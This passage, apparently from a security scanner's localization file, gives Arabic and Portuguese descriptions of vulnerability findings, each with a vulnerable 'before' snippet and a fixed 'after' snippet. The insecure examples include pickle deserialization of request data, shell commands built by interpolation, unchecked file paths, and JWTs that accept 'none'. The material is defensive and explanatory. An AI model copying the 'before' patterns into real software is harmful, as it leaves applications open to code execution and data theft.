      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # ينفّذ checkout للفرع الأساسي، وليس لكود طلب السحب — أو استخدم\n      # "pull_request" بدلاً من "pull_request_target" إذا لم تكن بحاجة\n      # إلى الصلاحيات/الأسرار الأوسع.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "بيانات الطلب تُفكَّك تسلسليًا (deserialize) بصيغة قادرة على تنفيذ كود",
    description:
      "pickle (بايثون)، unserialize() (بي إتش بي)، ObjectInputStream (جافا)، أو مكتبة node-serialize (Node) تقوم بتفكيك تسلسلي لقيمة مأخوذة مباشرة من الطلب. على عكس JSON، يمكن لهذه الصيغ تمثيل وتنفيذ كود أثناء عملية التفكيك التسلسلي نفسها — من يتحكم بالقيمة المُرسَلة يمكنه تحقيق تنفيذ كود عشوائي على الخادم.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  // JSON لا ينفّذ أبدًا كودًا أثناء التحليل، على عكس pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'الكود يقبل صراحةً رموز JWT غير موقّعة (خوارزمية "none")',
    description:
      '"none" تظهر ضمن الخوارزميات المقبولة للتحقق من رمز JWT. الرمز بخوارزمية "none" لا يملك أي توقيع يُتحقق منه: يمكن لأي شخص بناء رمز بأي محتوى (مثل دور مسؤول) وسيقبله الكود كصالح.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // لا تُدرِج أبدًا "none" ضمن الخوارزميات المقبولة`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access معطَّل على دلو S3 مُعرَّف في Terraform",
    description:
      'واحدة أو أكثر من الحمايات الأربع في "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) مضبوطة على false. لا يعني ذلك أن الدلو عام بالفعل، لكنه يزيل شبكة أمان كانت ستمنع جعله عامًا عن طريق الخطأ مستقبلاً.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "سياسة IAM مُعرَّفة في Terraform تمنح وصولاً كاملاً",
    description:
      'عبارة (statement) بإجراء "*" ومورد "*" تمنح وصولاً كاملاً إلى كل خدمة ومورد في AWS — نفس الفحص الذي يُجرى على حالة IAM الفعلية، لكن هنا يُقرأ مباشرة من الكود قبل تطبيقه حتى. قد يكون ذلك مقصودًا لدور طوارئ، لكن يجب التأكد من ذلك: للاستخدام اليومي، امنح فقط الصلاحيات اللازمة فعلاً.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "دلو Google Cloud Storage أصبح قابلاً للقراءة من أي شخص",
    description:
      'مورد "google_storage_bucket_iam_member" أو "google_storage_bucket_iam_binding" يمنح دورًا لـ "allUsers" أو "allAuthenticatedUsers" — الأول يجعل الدلو قابلاً للقراءة من أي شخص على الإنترنت، حتى دون حساب Google؛ والثاني من أي شخص يملك أي حساب Google، وليس فقط من ينبغي أن يملك الوصول.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # فقط من ينبغي أن يملك الوصول فعلاً، وليس allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "الوصول العام إلى الكائنات الثنائية (blobs) مفعَّل على حساب تخزين Azure",
    description:
      '"allow_blob_public_access" مضبوط على true في "azurerm_storage_account": أي شخص يعرف رابط كائن ثنائي أو حاوية جُعلت عامة يمكنه قراءته، دون أي مصادقة.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "دور IAM في Google Cloud يمنح وصولاً كاملاً (Owner/Editor)",
    description:
      '"google_project_iam_binding"/"google_project_iam_member" (أو ما يعادلها على مستوى المؤسسة/المجلد) يُسند الدور الأساسي "roles/owner" أو "roles/editor" — وصول شبه كامل إلى كل خدمة في المشروع. قد يكون ذلك مقصودًا لحساب طوارئ، لكن يجب التأكد من ذلك: للاستخدام اليومي، امنح فقط الأدوار المحددة مسبقًا الأكثر تحديدًا واللازمة فعلاً.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # فقط الدور المحدد مسبقًا اللازم فعلاً، وليس roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "تعيين دور في Azure يمنح وصولاً كاملاً (Owner)",
    description:
      '"azurerm_role_assignment" يُسند الدور "Owner" — وصول كامل، بما في ذلك التحكم في صلاحيات المستخدمين الآخرين، على كامل النطاق المُسند (اشتراك، مجموعة موارد...). قد يكون ذلك مقصودًا لحساب طوارئ، لكن يجب التأكد من ذلك: للاستخدام اليومي، امنح فقط الدور الأكثر تحديدًا واللازم فعلاً (مثل "Contributor" على مجموعة موارد واحدة).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # فقط الدور الأكثر تحديدًا واللازم فعلاً، وليس Owner على كامل الاشتراك\n}`,
    },
  },
  "weak-random-token": {
    title: "رمز أمان مُولَّد بمولّد أرقام عشوائية غير آمن تشفيريًا",
    description:
      "قيمة باسم يشبه token/session/reset/otp/csrf مُولَّدة باستخدام Math.random() (جافاسكريبت)، أو random.random() (بايثون)، أو rand() (بي إتش بي) — مولّدات غير مصممة للأمان، تسلسلاتها قابلة للتنبؤ. رمز مُولَّد بهذه الطريقة يمكن تخمينه أو إعادة بنائه، مما يُفقِد الغرض الذي وُجد لأجله (مثل رابط إعادة تعيين كلمة مرور يمكن لأي شخص توقّعه).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto، وليس Math.random — غير قابل للتنبؤ`,
    },
  },
  "ldap-injection": {
    title: "فلتر LDAP مبني بدمج قيمة من الطلب مباشرة",
    description:
      'سطر يبني فلتر LDAP (مثل "(uid=...)") يتضمن مباشرة قيمة مأخوذة من الطلب، دون أي معالجة (escape) للأحرف الخاصة بـ LDAP. من يتحكم بتلك القيمة يمكنه تغيير منطق الفلتر — مثلاً تجاوز فحص مصادقة أو قراءة بيانات من الدليل (directory) لا ينبغي له رؤيتها.',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // يجب دائمًا معالجة (escape) أحرف LDAP الخاصة قبل استخدامها في فلتر\nclient.search(base, { filter });",
    },
  },
  "header-injection": {
    title: "قيمة من الطلب تنتهي مباشرة في ترويسة (header) استجابة HTTP",
    description:
      "تُضبط ترويسة استجابة HTTP بقيمة مأخوذة مباشرة من الطلب (query، body، params)، دون التحقق من خلوّها من فاصل أسطر (CRLF). يمكن لمهاجم إدراج ترويسات إضافية أو حتى استجابة مختلفة بالكامل — response splitting — مما يتيح له التلاعب بالتخزين المؤقت (cache)، أو ملفات تعريف الارتباط (cookies)، أو المحتوى المعروض لمستخدمين آخرين.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "ملف Dockerfile لا يضبط مستخدمًا غير root",
    description:
      "لا توجد تعليمة USER في Dockerfile: دون تحديدها، يعمل الحاوية كـ root. إذا تمكّن مهاجم من تنفيذ كود داخل الحاوية (مثل استغلال مكتبة ضعيفة)، فإن كونه root داخل الحاوية يسهّل احتمال الهروب نحو المضيف — أو تأثيرًا أوسع على النظام المحيط.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "بيان Kubernetes لا يفرض صراحةً التشغيل كمستخدم غير root",
    description:
      'لا وجود لـ "runAsNonRoot" في أي مكان من البيان (لا على مستوى الـ pod ولا الحاوية): دون ضبطها، تعمل الحاوية بالمستخدم الذي تحدده صورتها — غالبًا root افتراضيًا، إن لم تكن الصورة نفسها قد غيّرت ذلك. ضبطها صراحةً إلى true يجعل بدء تشغيل الـ pod يفشل إذا حاولت الصورة التشغيل كـ root رغم ذلك، بدلاً من اكتشاف الأمر بعد وقوع حادثة فقط.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "إجراء (action) من طرف ثالث في CI غير مثبَّت على نسخة دقيقة (commit SHA)",
    description:
      'يستخدم سير العمل إجراءً من طرف ثالث مُشارًا إليه بوسم (tag) أو فرع (مثل "@v1"، "@main") بدلاً من commit SHA. من يصونه — أو من يخترق حسابه — يمكنه نقل ذلك المرجع إلى commit مختلف في أي وقت، مغيّرًا بصمت ما يعمل في CI، مع إمكانية الوصول إلى أسراره. commit SHA يشير دائمًا إلى نفس الكود تمامًا.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1، مثبَّتة على commit SHA — حدّث الـ SHA عند تحديث النسخة`,
    },
  },
  "gha-excessive-permissions": {
    title: "سير العمل يمنح نفسه كل صلاحيات الرمز المميز بدلاً من التي يستخدمها فقط",
    description:
      '"permissions: write-all" يمنح GITHUB_TOKEN الخاص بسير العمل صلاحية الكتابة في كل شيء — issues، طلبات السحب، الحزم، عمليات النشر — حتى لو كان سير العمل يستخدم جزءًا منها فقط. إذا تم اختراق خطوة في سير العمل (تبعية خبيثة، سكربت مُحقَن)، تزيد تلك الصلاحيات الأوسع مما يستطيع فعله من يستغلها.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # فقط الصلاحيات التي يستخدمها سير العمل فعلاً`,
    },
  },
  "insecure-cookie-flags": {
    title: "ملف تعريف ارتباط (cookie) للجلسة أو المصادقة مضبوط دون علامتي Secure وHttpOnly",
    description:
      'ملف تعريف ارتباط باسم يشبه session/auth/token مضبوط دون "httpOnly" و"secure" ضمن خياراته. دون httpOnly، يمكن لأي JavaScript في الصفحة — بما في ذلك كود مُحقَن عبر XSS — قراءة ذلك الملف. دون secure، يمكن أيضًا إرساله عبر اتصال HTTP غير مشفّر.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "تبعية غير آمنة:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "لا تتوفر بعد نسخة مصححة معروفة — ففكّر في حزمة بديلة أو تابع تحديثات المشروع."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "سر مكتوب مباشرة في تعليمة ENV أو ARG داخل Dockerfile",
    description:
      "متغيّر باسم يشبه password/secret/token/key له قيمة حرفية في تعليمة ENV أو ARG. على عكس ملف .env (الذي عادة لا ينتهي داخل الصورة)، هذه القيمة تُخبَز داخل صورة Docker نفسها — أي شخص يمكنه سحبها أو فحص سجل الطبقات (layer history) يستطيع استعادتها، حتى لو أُزيل السطر في نسخة لاحقة من Dockerfile.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# يُمرَّر عبر: docker build --build-arg DB_PASSWORD=*** (أو، الأفضل من ذلك،\n# استخدام BuildKit secret mount، الذي لا ينتهي أبدًا في سجل الطبقات)`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'صورة الأساس في Dockerfile تستخدم الوسم ":latest"',
    description:
      'تعليمة FROM تستخدم صراحةً الوسم ":latest" بدلاً من نسخة دقيقة. "latest" يتغيّر مع الوقت: نفس عملية البناء (build)، عند إعادتها في وقت آخر، قد تحصل على نسخة مختلفة من صورة الأساس — بناء غير قابل لإعادة الإنتاج، وتحديث غير مرغوب فيه قد يصل دون أن يقرر ذلك أحد.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "ملف Dockerfile يُنزّل ملفًا عن بُعد باستخدام ADD بدلاً من COPY",
    description:
      "تعليمة ADD برابط http/https تُنزّل ملفًا من الإنترنت أثناء عملية البناء، دون أي تحقق من السلامة ودون أن يكون المحتوى مرئيًا في المستودع. إذا تم اختراق ذلك الرابط مستقبلاً، يدمج البناء محتوى عشوائيًا دون أن يلاحظ أحد ذلك بمجرد قراءة Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "حاوية في بيان Kubernetes تعمل بوضع privileged",
    description:
      '"privileged: true" في securityContext الخاص بالحاوية يعطّل تقريبًا كل العزل المعتاد بين الحاوية والمضيف: يمكن للحاوية الوصول إلى أجهزة المضيف، وتغيير إعدادات شبكته، وفي حالات كثيرة الحصول فعليًا على صلاحيات root على الجهاز الذي يشغّلها. نادرًا ما يكون ضروريًا لتطبيق عادي.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # فقط القدرات (capabilities) اللازمة فعليًا`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "سر مكتوب نصًا صريحًا في متغيّر env ضمن بيان Kubernetes",
    description:
      'متغيّر بيئة باسم يشبه password/secret/token/key له قيمة حرفية ("value:") بدلاً من أن يُقرأ من Secret ("valueFrom.secretKeyRef"). البيان نفسه — وغالبًا ما يُحفظ في مستودع — يحتوي بالتالي على السر نصًا صريحًا، مرئيًا حتى لمن يستطيع فقط قراءة الإعدادات، دون الحاجة لتنفيذ أوامر في الكتلة (cluster).',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "حاوية في بيان Kubernetes مضبوطة لتعمل كـ root",
    description:
      '"runAsUser: 0" أو "runAsNonRoot: false" في securityContext يفرضان صراحةً التشغيل كـ root داخل الحاوية. إذا تمكّن مهاجم من تنفيذ كود في الحاوية (مثل استغلال مكتبة ضعيفة)، فإن كونه root داخل الحاوية يسهّل احتمال الهروب نحو المضيف — أو تأثيرًا أوسع.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "حاوية في بيان Kubernetes يمكنها الحصول على صلاحيات أكثر مما بدأت به",
    description:
      '"allowPrivilegeEscalation: true" في securityContext يسمح لعملية داخل الحاوية بالحصول على صلاحيات أكثر من العملية التي أطلقتها (مثل عبر ملف تنفيذي بخاصية setuid). مع وجود ثغرة في التطبيق، يصبح ذلك خطوة إضافية نحو تنفيذ كود بصلاحيات أكبر من المقصود.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "حجرة (pod) في بيان Kubernetes تشارك شبكة المضيف أو عملياته أو ذاكرته المشتركة",
    description:
      '"hostNetwork" أو "hostPID" أو "hostIPC" مضبوطة على true تُخرج الـ pod من عزله المعتاد: hostNetwork يعرّض الـ pod على شبكة المضيف (متجاوزًا سياسات شبكة الكتلة)، hostPID يمنحه رؤية لكل عمليات الجهاز المضيف، hostIPC يمنحه وصولاً إلى الذاكرة المشتركة للمضيف. نادرًا ما يكون ضروريًا لتطبيق عادي — عادة فقط لأدوات نظام/مراقبة منخفضة المستوى.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
},
  pt: {
  "supabase-service-role-in-client": {
    title: "A chave secreta do Supabase acaba numa parte exposta ao navegador",
    description:
      "Uma variável com prefixo público (ex. NEXT_PUBLIC_, VITE_) ou um ficheiro do lado do cliente referencia a service role key do Supabase. Esta chave contorna a Row Level Security: se acabar no bundle do navegador, qualquer pessoa pode lê-la e agir como administrador da base de dados.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (apenas servidor)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Há palavras-passe ou chaves secretas escritas diretamente no código",
    description:
      "Uma chave API, um token ou uma palavra-passe parecem escritos como valor literal em vez de lidos a partir de uma variável de ambiente. Quem ler o código-fonte (ou o repositório, se for público) obtém esse segredo.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Um ficheiro com as palavras-passe reais do projeto está entre os analisados",
    description:
      "Um ficheiro .env com valores reais (não um .env.example) está incluído na análise. Se este ficheiro acabar num repositório ou num deploy público, todas as credenciais que contém ficam expostas.",
    fix: {
      before: `# .env (submetido por engano)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (submetido)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# o .env fica fora do repositório (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Qualquer pessoa pode ler ou modificar os dados de todos os utilizadores",
    description:
      "A Row Level Security está desativada, ou uma policy permite o acesso a qualquer pessoa (USING (true)) sem verificar quem está a fazer o pedido. Qualquer utilizador autenticado — ou até anónimo — pode ler ou modificar os dados de todos os outros.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Um valor introduzido pelo utilizador é colado diretamente numa consulta à base de dados",
    description:
      "Uma consulta SQL é construída concatenando ou interpolando diretamente uma string em vez de usar parâmetros. Se esse texto vier (mesmo que indiretamente) de um utilizador, pode alterar a própria consulta — injeção SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "As palavras-passe não parecem estar protegidas",
    description:
      "Um campo de palavra-passe é guardado exatamente como chegou no pedido, e nenhuma função de hashing (bcrypt, argon2, scrypt) aparece no ficheiro. Se a base de dados for comprometida, todas as palavras-passe ficam imediatamente utilizáveis.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "O segredo usado para assinar os logins está escrito em texto simples no código",
    description:
      "O segredo passado a jwt.sign / jwt.verify (ou a variável JWT_SECRET) é um valor literal no código em vez de vir de uma variável de ambiente. Quem o ler pode criar tokens de acesso válidos para qualquer utilizador.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "O servidor pode ser forçado a executar comandos externos",
    description:
      "Uma função que executa comandos de sistema (exec, execSync, spawn) recebe uma string construída por interpolação ou concatenação. Se parte dessa string vier de uma entrada do utilizador, quem a controlar pode executar comandos arbitrários no servidor.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "Uma nova tabela parece ser criada sem proteção",
    description:
      "Uma migração SQL cria uma tabela mas não ativa a Row Level Security para essa mesma tabela no mesmo ficheiro. Enquanto assim permanecer, a tabela começa sem nenhuma restrição sobre quem a pode ler ou escrever.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "O site aceita pedidos de qualquer outro site",
    description:
      "O cabeçalho CORS está configurado para aceitar pedidos de qualquer origem (*), ou o middleware cors() é usado sem restrições. Qualquer site de terceiros pode chamar as suas APIs a partir do navegador de um utilizador já autenticado.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Uma função com permissões de administrador não verifica quem a está a usar",
    description:
      "Uma rota ou função cujo nome sugere operações de administração não contém, nas linhas próximas, nenhuma verificação de autenticação ou de papel (role). Qualquer pessoa que conheça o URL poderia executá-la.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "O site pode ser forçado a executar código externo",
    description:
      "Um pedido HTTP de saída (fetch, axios) usa diretamente um valor vindo do pedido de um utilizador como URL de destino. Um utilizador malicioso pode fazer o seu servidor chamar endereços internos ou arbitrários — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "As palavras-passe são protegidas com um método hoje fácil de quebrar",
    description:
      "Na mesma linha, md5() ou sha1() são aplicados a um valor ligado a uma palavra-passe. Estes algoritmos são rápidos demais de calcular: um atacante com a base de dados pode tentar milhares de milhões de palavras-passe por segundo.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Texto escrito pelos utilizadores pode executar código no navegador",
    description:
      "Conteúdo é inserido na página como HTML em bruto (dangerouslySetInnerHTML, v-html, .innerHTML) em vez de texto simples. Se esse conteúdo incluir entrada do utilizador, pode conter scripts que correm no navegador de quem ler a página.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// ou, se for necessário HTML: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "O espaço para ficheiros enviados é visível por qualquer pessoa",
    description:
      "Um bucket de armazenamento (Supabase Storage, S3) está configurado como público. Se contiver documentos, fotos ou ficheiros enviados por utilizadores, qualquer pessoa que conheça — ou adivinhe — o caminho pode aceder-lhes sem autenticação.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// sirva os ficheiros com URLs assinados de duração limitada: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Um único link é suficiente para apagar ou alterar dados",
    description:
      "Uma rota GET executa uma operação que altera dados (o caminho contém delete/remove/update/edit). Os pedidos GET correm apenas ao visitar um link ou ao carregar uma imagem de um site externo — o ponto de partida clássico de um ataque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Os dados de login guardados no navegador não estão bem protegidos",
    description:
      "Um token de acesso é guardado em localStorage. Ao contrário de um cookie httpOnly, qualquer script a correr na página (incluindo um malicioso injetado via XSS) pode lê-lo e roubá-lo.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// definir o token como um cookie httpOnly a partir do servidor:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "O site pode ser usado para redirecionar para um site fraudulento",
    description:
      "O site redireciona o utilizador para um endereço retirado diretamente do pedido (query, body, params) sem verificar que é um domínio conhecido. Um link que parece apontar para o seu site pode na realidade levar a uma página de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Mudar um número no endereço pode mostrar os dados de outra pessoa",
    description:
      "Uma consulta à base de dados usa diretamente um identificador retirado do URL (req.params.id) sem verificar, nas linhas próximas, que pertence ao utilizador que faz o pedido. Mudar o id no endereço pode dar acesso aos dados de outro utilizador — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "O formulário de login não bloqueia demasiadas tentativas seguidas",
    description:
      "Uma rota de login está definida no ficheiro, mas não há nenhum sinal de middleware de rate-limiting no mesmo ficheiro. Sem um limite de tentativas, um atacante pode tentar palavras-passe em sequência (força bruta) sem ser travado.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Palavras-passe ou dados sensíveis acabam nos logs",
    description:
      "Uma chamada a console.log (ou semelhante) inclui uma variável chamada password, token, secret ou apiKey. Se estes logs acabarem num serviço externo ou num ficheiro, os dados sensíveis ficam expostos muito mais tempo do que o necessário.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "Um ficheiro no servidor pode ser lido ou escrito escolhendo o caminho a partir do exterior",
    description:
      "Uma função que lê, escreve ou envia um ficheiro recebe o caminho diretamente de um valor do pedido (query, body, params) sem verificar que fica dentro de uma pasta permitida. Um atacante pode inserir \"../\" para sair da pasta prevista e ler ou sobrescrever ficheiros arbitrários no servidor (ex. um ficheiro de configuração com credenciais).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Caminho não permitido")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Um valor introduzido pelo utilizador é executado como código dentro de uma consulta MongoDB",
    description:
      "O operador $where do MongoDB executa JavaScript do lado do servidor para cada documento — se essa string for construída concatenando um valor vindo do utilizador, quem a controlar pode fazer executar código arbitrário no contexto da base de dados, não apenas alterar o filtro como numa injeção SQL normal.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Um valor introduzido pelo utilizador é interpretado como um template, não como dado",
    description:
      "Uma função que compila/executa um template recebe o template INTEIRO a partir de um valor do pedido, em vez de usar um template fixo e passar só os dados. Um atacante pode escrever diretamente na sintaxe do motor de templates (ex. {{7*7}} para Jinja2) e executar código no servidor — Server-Side Template Injection, que muitas vezes leva à execução de comandos arbitrários, não apenas a um problema de visualização como o XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "O parser XML pode ser forçado a ler ficheiros ou fazer pedidos externos",
    description:
      "Um parser XML (DocumentBuilderFactory) é criado sem desativar explicitamente as entidades externas (DOCTYPE) nas linhas próximas. Se o parser receber XML de uma fonte não confiável, um atacante pode definir uma entidade externa para ler ficheiros no servidor ou fazê-lo contactar um endereço à sua escolha — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
